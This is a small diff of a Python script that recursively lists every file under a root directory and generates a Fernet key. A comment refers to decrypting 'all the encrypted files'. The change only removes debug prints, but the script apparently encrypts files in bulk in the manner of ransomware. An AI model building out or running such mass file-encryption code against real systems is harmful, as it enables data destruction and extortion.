@@ -29,12 +29,10 @@ def list_files(base_dir):
 
         elif os.path.isfile(os.path.join(base_dir, entry)):
             all_files.append(os.path.join(base_dir, entry))
-        # print("****\nentry: {}\nall_files: {}\n****\n".format(entry, all_files))
 
 key = Fernet.generate_key()
 
 list_files(root_dir)
-print("all_files: ", all_files)
 
 # Save the key for now so that we can also decrypt all the encrypted
 # files using the same key.
